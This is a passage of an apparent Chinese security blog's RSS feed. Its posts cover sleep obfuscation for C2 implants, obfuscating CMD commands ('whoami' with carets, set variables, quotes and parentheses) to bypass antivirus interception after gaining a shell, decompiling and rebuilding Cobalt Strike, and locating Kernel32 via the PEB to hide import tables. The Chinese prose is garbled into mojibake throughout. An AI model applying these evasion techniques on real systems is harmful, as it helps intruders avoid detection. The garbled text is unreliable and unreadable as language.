class=&#34;line&#34;&gt;DWORD e_lfanew = dosHeader-&amp;gt;e_lfanew;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;*)ImageBase + e_lfanew);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ImageSize = ntHeaders-&amp;gt;OptionalHeader.SizeOfImage;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//ImageSize = 0x0005e6b4;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 è¿™é‡Œè·å–å†…å­˜é•œåƒå¤§å°çš„ä»£ç æˆ‘åšäº†ä¿®æ”¹ï¼ŒåŸé¡¹ç›®çš„ä»£ç åœ¨æˆ‘æœ¬åœ°è¿è¡Œæ—¶è·å–åˆ°çš„å¤§å°å§‹ç»ˆä¸º 0ï¼Œæš‚æ—¶ä¹Ÿä¸æ¸…æ¥šä»€ä¹ˆæƒ…å†µã€‚&lt;br /&gt;
è¿™é‡Œæˆ‘ä»¬ä¿®æ”¹å®Œåå†ç¼–è¯‘å³å¯ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ messagebox æ¥æ¨¡æ‹Ÿ c2 æœåŠ¡ç«¯å‘é€çš„æŒ‡ä»¤ï¼Œä½¿ç”¨&lt;strong&gt; ProcessHacker&lt;/strong&gt; ç›‘æ§å†…å­˜å˜æ¢ã€‚&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;éç¡çœ æ—¶é—´æ®µ (äº‹ä»¶ç­‰å¾…æ—¶é—´æ®µ)ï¼š&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
&lt;img data-src=&#34;https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpvp4d5wtj31cz0u0x05.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;em&gt;&lt;strong&gt;ç¡çœ æ··æ·†æ—¶é—´æ®µï¼š&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
&lt;img data-src=&#34;https://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hrpvp7ovgyj31cu0u0aux.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://shut-td.github.io/CMD%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86/</guid>
            <title>CMDå‘½ä»¤æ··æ·†</title>
            <link>https://shut-td.github.io/CMD%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86/</link>
            <category term="æ”»é˜²æŠ€å·§" scheme="https://shut-td.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E5%B7%A7/" />
            <category term="æ”»é˜²æŠ€å·§" scheme="https://shut-td.github.io/tags/%E6%94%BB%E9%98%B2%E6%8A%80%E5%B7%A7/" />
            <pubDate>Wed, 03 Apr 2024 00:53:28 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;èƒŒæ™¯&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#èƒŒæ™¯&#34;&gt;#&lt;/a&gt; èƒŒæ™¯&lt;/h3&gt;
&lt;p&gt;å½“æˆ‘ä»¬è·å– shell æˆ–è€…è¿æ¥åˆ°è¿œæ§æ—¶ï¼Œç›´æ¥æ‰§è¡Œé«˜å±æ“ä½œä¼šè¢«æ‹¦æˆªå› æ­¤éœ€è¦åšå‘½ä»¤ä¸Šçš„æ··æ·†æ¥è¾¾åˆ°é™æ€å…æ€çš„æ•ˆæœã€‚&lt;/p&gt;
&lt;h5 id=&#34;1-è½¬ä¹‰ç¬¦å·è¿æ¥&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-è½¬ä¹‰ç¬¦å·è¿æ¥&#34;&gt;#&lt;/a&gt; 1ã€è½¬ä¹‰ç¬¦å·è¿æ¥&lt;/h5&gt;
&lt;p&gt;å³åœ¨å‘½ä»¤ä¸­é€šè¿‡å¡«å……  ^  è¯¥ç¬¦å·è¿›è¡Œæ··æ·†&lt;br /&gt;
 &lt;figure class=&#34;highlight cos&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^h&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^o&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^am&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^i&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
&lt;img data-src=&#34;https://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hoczg4gntcj30dk02pglk.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;strong&gt; æ³¨æ„è¿™é‡Œä¸€æ¬¡åªèƒ½ç”¨ä¸€ä¸ª ^ è¿›è¡Œè¿æ¥&lt;/strong&gt;&lt;/p&gt;
&lt;h5 id=&#34;2-åˆ©ç”¨setè®¾ç½®å˜é‡å¹¶ä½¿ç”¨è¿ç»­æ‰§è¡Œè¾¾åˆ°æ··æ·†æ•ˆæœ&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-åˆ©ç”¨setè®¾ç½®å˜é‡å¹¶ä½¿ç”¨è¿ç»­æ‰§è¡Œè¾¾åˆ°æ··æ·†æ•ˆæœ&#34;&gt;#&lt;/a&gt; 2ã€åˆ©ç”¨ set è®¾ç½®å˜é‡å¹¶ä½¿ç”¨ &amp;amp;&amp;amp; è¿ç»­æ‰§è¡Œè¾¾åˆ°æ··æ·†æ•ˆæœ&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cos&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;set&lt;/span&gt; gg=wh&amp;amp;&amp;amp;&lt;span class=&#34;built_in&#34;&gt;%gg&lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;%oami&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;å†åŠ ä¸Š&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;çš„æ“ä½œ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;set&lt;/span&gt; gg=&lt;span class=&#34;keyword&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^h&lt;/span&gt;^&amp;amp;&amp;amp;&lt;span class=&#34;built_in&#34;&gt;%gg&lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;%oa&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^mi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hocznijn5cj30ei023weh.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hocznwfke0j30fq02jdfu.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;3-åŒå¼•å·åŒ…è£¹&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-åŒå¼•å·åŒ…è£¹&#34;&gt;#&lt;/a&gt; 3ã€åŒå¼•å·åŒ…è£¹&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;wh&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;o&lt;span class=&#34;string&#34;&gt;&amp;quot;ami&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&amp;quot;w&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;h^o&amp;quot;&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;am^i&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hoczp72g9fj30c202swef.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hoczplami2j30dw02et8o.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;4-æ‹¬å·åŒ…è£¹&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-æ‹¬å·åŒ…è£¹&#34;&gt;#&lt;/a&gt; 4ã€æ‹¬å·åŒ…è£¹&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cos&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;((((((whoami))))))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;æ··åˆæœ‰é™åªèƒ½ä¸­é—´å’Œ ^ é…åˆ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;((((((&lt;span class=&#34;keyword&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^h&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^o&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^a&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^m&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^i&lt;/span&gt;))))))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
&lt;img data-src=&#34;https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hoczqr3468j30ea02et8p.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hoczr5q7d6j30fg02kt8q.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;5-unicodeæ›¿æ¢éé€šç”¨&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5-unicodeæ›¿æ¢éé€šç”¨&#34;&gt;#&lt;/a&gt; 5ã€Unicode æ›¿æ¢ (éé€šç”¨)&lt;/h5&gt;
&lt;p&gt;Ê± Ê° Ê² Ê³ Ê· Ê¸ Ë¢ Ë£ Ë¡&lt;br /&gt;
Ê· ä¿®é¥°å­—æ¯å°å†™ W&lt;br /&gt;
Ê¸ ä¿®é¥°å­—æ¯å°å†™ Y&lt;br /&gt;
Ê° ä¿®é¥°å­—æ¯å°å†™ H&lt;br /&gt;
Ê± å¸¦é’©çš„ä¿®é¥°å­—æ¯å°å†™ H&lt;br /&gt;
Ê² ä¿®é¥°å­—æ¯å°å†™ J&lt;br /&gt;
Ê³ ä¿®é¥°å­—æ¯å°å†™ R&lt;br /&gt;
Ë¡ ä¿®é¥°å­—æ¯å°å†™ L&lt;br /&gt;
Ë¢ ä¿®é¥°å­—æ¯å°å†™ S&lt;br /&gt;
Ë£ ä¿®é¥°å­—æ¯å°å†™ X&lt;br /&gt;
 è¿™ä¸ªä¸å¤ªè¡Œï¼Œé€‚ç”¨æ€§å¤ªçª„&lt;/p&gt;
&lt;p&gt;è¿™ä¹Ÿæ˜¯æˆ‘çªå‘å¥‡æƒ³è¯•äº†å°†è¿‘åŠä¸ªå¤šå°æ—¶è¯•å‡ºæ¥æ€»ç»“å‡ºæ¥çš„ï¼Œç»“æœä¸Šç½‘ä¸€æŸ¥æ—©å°±æœ‰å¤§ä½¬æ€»ç»“å¥½äº† (emo äº†ï½) è´´ä¸ªé“¾æ¥æŠŠ ==&amp;gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvbmV0d29yay8yOTEwMjAuaHRtbA==&#34;&gt;https://www.freebuf.com/articles/network/291020.html&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://shut-td.github.io/%E6%BA%90%E7%A0%81%E5%8F%8D%E7%BC%96%E8%AF%91%E5%8F%8A%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98-CS%E4%BA%8C%E5%BC%80%E7%B3%BB%E5%88%97/</guid>
            <title>æºç åç¼–è¯‘åŠæ­å»ºé—®é¢˜[CSäºŒå¼€ç³»åˆ—]</title>
            <link>https://shut-td.github.io/%E6%BA%90%E7%A0%81%E5%8F%8D%E7%BC%96%E8%AF%91%E5%8F%8A%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98-CS%E4%BA%8C%E5%BC%80%E7%B3%BB%E5%88%97/</link>
            <category term="å®‰å…¨å·¥å…·å¼€å‘" scheme="https://shut-td.github.io/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/" />
            <category term="å®‰å…¨å·¥å…·å¼€å‘" scheme="https://shut-td.github.io/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/" />
            <pubDate>Mon, 01 Apr 2024 02:35:14 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;æºç çš„åç¼–è¯‘åŠæ­å»º&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#æºç çš„åç¼–è¯‘åŠæ­å»º&#34;&gt;#&lt;/a&gt; æºç çš„åç¼–è¯‘åŠæ­å»º&lt;/h3&gt;
&lt;p&gt;æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯ jadx è¿›è¡Œçš„åç¼–è¯‘ï¼Œå› æ­¤åé¢ä¼šæœ‰ä¸€äº›ä»£ç ä¸Šçš„å‘éœ€è¦æ³¨æ„ä¸€ä¸‹ã€‚&lt;br /&gt;
æ–°å»ºå¦‚ä¸‹å›¾çš„ç›®å½•ç»“æ„ï¼Œå¹¶å°†åŸå§‹çš„ CSjar åŒ…æ”¾è¿› cs_bin å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hoaqyt5couj30me04874r.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ jadx åç¼–è¯‘å®Œåå¯¼å‡ºä¸º graddle é¡¹ç›®è‡³ cs_src ç›®å½•ä¸­å³å¯è·å–æºç å³ä¸‹å›¾ä¸¤ä¸ªæ–‡ä»¶å¤¹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hoar1cl14pj30m8036mxd.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæ‰“å¼€ IDEA æ–°å»ºä¸€ä¸ªç©ºé¡¹ç›®å¹¶æ–°å»ºä¸€ä¸ª decompiled_src ç›®å½•ï¼Œå¹¶å°† source ç›®å½•å¤åˆ¶å…¥ decompiled_src å³å¯ï¼Œåç»­æ“ä½œå‚è€ƒè¿™ç¯‡&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzM3ODUzMy5odG1s&#34;&gt;äºŒå¼€æ­å»º&lt;/span&gt;çš„æ–‡ç« ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨è¿™é‡Œä¸»è¦è®²ä¸‹å¯èƒ½æ˜¯ jadx åç¼–è¯‘çš„é—®é¢˜å¯¼è‡´çš„åç¼–è¯‘åçš„æºä»£ç æœ‰äº›åœ°æ–¹ä¼šå‡ºé”™éœ€è¦æ‰‹åŠ¨æ›´æ­£ä¸€ä¸‹ï¼Œè¿™é‡Œä¸¾å‡ ä¸ªä¾‹å­ï¼š&lt;br /&gt;
&lt;img data-src=&#34;https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hoar8i6pgnj30mv0a0wg6.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
è¿™é‡ŒæŠ¥é”™çš„åŸå‹æ˜¯è¿™æ®µä»£ç ï¼š&lt;br /&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (Map.Entry entry : &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.hooks.entrySet())&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	.......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 è¿™é‡Œåªéœ€è¦è·Ÿè¿› &lt;code&gt;this.hooks.entrySet()&lt;/code&gt;  è§‚å¯Ÿä¸€ä¸‹è¿”å›çš„ç±»å‹æ˜¯ä»€ä¹ˆå³å¯ï¼Œæ¯”å¦‚è¿™é‡Œè·Ÿè¿›ä¹‹åå‘ç°æ˜¯ä¸ª Set é›†åˆï¼Œåœ¨å¤–é¢ç”¨ Set é›†åˆå°è£…ä¸€ä¸‹åœ¨æ›¿æ¢å³å¯è§£å†³æŠ¥é”™ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æ³›å‹è¦å¯¹é½ï¼Œå†æ¯”å¦‚ä¸‹å›¾ä¹Ÿæ˜¯è¿™æ ·ã€‚&lt;br /&gt;
&lt;img data-src=&#34;https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hoar8n7oogj30m20553ze.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;è¿˜æœ‰ä¸€ç§æŠ¥é”™å°±æ˜¯å±æ€§æŠ¥é”™ï¼Œè·Ÿè¿›é‚£ä¸ªç±»é‡Œçœ‹ä¸€ä¸‹æœ€æ¥è¿‘çš„å±æ€§æ˜¯ä»€ä¹ˆæ”¹æˆä»€ä¹ˆå°±è¡Œäº†ï¼Œè¿˜æœ‰åŒ…æ‹¬ä¸€äº›æ˜æ˜¾çš„é€»è¾‘ä¸Šçš„é”™è¯¯æ¯”å¦‚ä»å¤–é¢æ¥äº†å‚æ•°å´ä½¿ç”¨å¦ä¸€ä¸ªèµ‹å€¼ä¸ºç©ºçš„å‚æ•°å»æ¯”è¾ƒï¼š&lt;br /&gt;
&lt;img data-src=&#34;https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hoarg84tvzj30xq09s3zo.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
é”™è¯¯åŸå‹ä¸ºç¬¬äºŒè¡Œå¤šåŠ äº† &lt;code&gt;String text2 = &amp;quot;&amp;quot;&lt;/code&gt; ï¼Œå¹¶åœ¨ &lt;code&gt;sum += text.charAt(x)&lt;/code&gt;  è¿™æ®µä»£ç å˜æˆäº† &lt;code&gt;sum += text2.charAt(x)&lt;/code&gt;  ä¿®æ­£è¿‡æ¥å³å¯ï¼Œåæ­£è¿™ç±»é€»è¾‘ä¸Šçš„ä»£ç é—®é¢˜è¿˜æ˜¯ç¨å¾®æ³¨æ„ä¸€ä¸‹å°±è¡Œã€‚&lt;/p&gt;
&lt;p&gt;è‡³æ­¤ç¯å¢ƒåŸºæœ¬æ­å»ºå®Œæˆï¼Œå¯ä»¥å¯åŠ¨ Agressor ç«¯è¿›è¡Œç›¸å…³ä¾‹å¦‚ UI çš„ä¿®æ”¹ä»¥åŠç›¸å…³åŠŸèƒ½çš„äºŒå¼€äº†&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://shut-td.github.io/%E8%87%AA%E6%88%91%E5%AE%9A%E4%BD%8D-%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B-To-Future/</guid>
            <title>è‡ªæˆ‘å®šä½ &amp; æœªæ¥å±•æœ› To Future~</title>
            <link>https://shut-td.github.io/%E8%87%AA%E6%88%91%E5%AE%9A%E4%BD%8D-%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B-To-Future/</link>
            <pubDate>Fri, 15 Mar 2024 13:24:48 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;è‡ªæˆ‘å®šä½&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#è‡ªæˆ‘å®šä½&#34;&gt;#&lt;/a&gt; è‡ªæˆ‘å®šä½&lt;/h3&gt;
&lt;p&gt;ä¸å¤šè¯´ä¸Šå›¾&lt;br /&gt;
&lt;img data-src=&#34;//dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hnrmbqbnrvj30q40q475r.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç›®å‰ç®—æ˜¯å¤šæ–¹é¢å‘è‚²å§ï¼Œæ­£åœ¨å­¦ä¹ æœ‰å…³å†…æ ¸ã€é©±åŠ¨ã€é€†å‘ä»¥åŠä»£å®¡æœ‰å…³çš„çŸ¥è¯†ã€‚&lt;/li&gt;
&lt;li&gt;ç°åœ¨çš„æƒ³æ³•ä¸»è¦è¿˜æ˜¯æœç€ä»£ç å®¡è®¡å’Œå®‰å…¨å¼€å‘èµ°å§ï¼Œç›®æ ‡æš‚æ—¶å°±æ˜¯è¯•ç€äºŒå¼€æˆ–è€…ç›´æ¥è‡ªç ”ä¸€æ•´å¥— C2ï¼Œå®¡ä¸€å®¡æ¯”è¾ƒå¤§çš„å¼€æºæ¡†æ¶å§ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;æœªæ¥å±•æœ›-to-future~&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#æœªæ¥å±•æœ›-to-future~&#34;&gt;#&lt;/a&gt; æœªæ¥å±•æœ› To Future~&lt;/h3&gt;
&lt;p&gt;å¯èƒ½æ›´æƒ³å»å®‰å…¨ç ”ç©¶ / å®éªŒå®¤ / æ”»é˜²çš„å²—ä½å§ğŸ™Œ&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://shut-td.github.io/%E6%84%8F%E5%A4%96%E7%9A%84Kernel32%E5%9F%BA%E5%9D%80%E5%AF%BB%E5%9D%80/</guid>
            <title>æ„å¤–çš„Kernel32åŸºå€å¯»å€</title>
            <link>https://shut-td.github.io/%E6%84%8F%E5%A4%96%E7%9A%84Kernel32%E5%9F%BA%E5%9D%80%E5%AF%BB%E5%9D%80/</link>
            <category term="Pwn" scheme="https://shut-td.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" />
            <category term="Pwn" scheme="https://shut-td.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" />
            <pubDate>Fri, 15 Mar 2024 11:03:18 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;å‰è¨€&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#å‰è¨€&#34;&gt;#&lt;/a&gt; å‰è¨€&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;åœ¨PEæ–‡ä»¶ç»“æ„ä¸­æœ‰ä¸ªååˆ†é‡è¦çš„ä¸œè¥¿ï¼Œä¹Ÿæ˜¯æ€è½¯è¿›è¡Œé™æ€åˆ†ææ—¶å¸¸æ­»ç›¯ç€çš„ï¼Œé‚£å°±æ˜¯æˆ‘ä»¬çš„å¯¼å…¥è¡¨(Import Directory)ï¼Œå†…å«äº†è¯¥æ–‡ä»¶è¿è¡Œæ—¶è°ƒç”¨çš„DLLæ–‡ä»¶ä»¥åŠå¯¼å‡ºå‡½æ•°ã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnrid6mj92j31cx0tmgu8.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;å¦‚æœæˆ‘ä»¬ç¼–å†™è„šæœ¬æ—¶ä½¿ç”¨Windowsåº“å†…è‡ªå¸¦çš„APIï¼Œé‚£ä¹ˆè¿™äº›DLLæ–‡ä»¶ä»¥åŠåŒ…å«åœ¨å†…çš„å¯¼å‡ºå‡½æ•°ä¾¿ä¼šä¸€è§ˆæ— ä½™å¾—æš´éœ²å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†è¿™äº›éƒ½éšè—æ‰å®ç°å¯¼å…¥è¡¨éšè—ã€‚å¦‚ä½•å®ç°æœ€é‡è¦çš„ä¸€æ­¥å°±æ˜¯é€šè¿‡PEBæ‰¾åˆ°æˆ‘ä»¬çš„Kernel32åŸºå€ã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;windbgè°ƒè¯•ä¸­é‡åˆ°çš„é—®é¢˜ä¸è§£å†³&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windbgè°ƒè¯•ä¸­é‡åˆ°çš„é—®é¢˜ä¸è§£å†³&#34;&gt;#&lt;/a&gt; Windbg è°ƒè¯•ä¸­é‡åˆ°çš„é—®é¢˜ä¸è§£å†³&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Windbgçš„ä½¿ç”¨åŠå®‰è£…æ•™ç¨‹ç½‘ä¸Šèµ„æ–™å¾ˆå¤šå°±ä¸å¤šè¯´äº†ï¼Œä¸»è¦æä¸€ä¸‹åœ¨è°ƒè¯•æ—¶é‡åˆ°çš„å‡ ä¸ªé—®é¢˜ã€‚
1ã€åœ¨é™„åŠ è¿›ç¨‹æ—¶å‡ºç°é”™è¯¯ï¼Œå…ˆå°è¯•ä»¥ç®¡ç†å‘˜æƒé™å¯åŠ¨Windbgå†é™„åŠ ï¼Œè‹¥ä»ç„¶æŠ¥é”™åˆ™ç›´æ¥File-&amp;gt;Open Executable Fileç›´æ¥å¯åŠ¨ä»»æ„ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œè°ƒè¯•çš„ï¼Œå’Œé™„åŠ æ˜¯ä¸€æ ·çš„ã€‚
2ã€è°ƒè¯•è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯ Symbol _PEB ä¸å­˜åœ¨ç­‰ç­‰ä¹‹ç±»çš„ï¼Œåœ¨ç¬¦å·æœç´¢è·¯å¾„(Symbol File Path Search)ä¸­æ·»åŠ è·¯å¾„ï¼šSRV*c:\mysymbol* http://msdl.microsoft.com/download/symbols å³å¯ã€‚
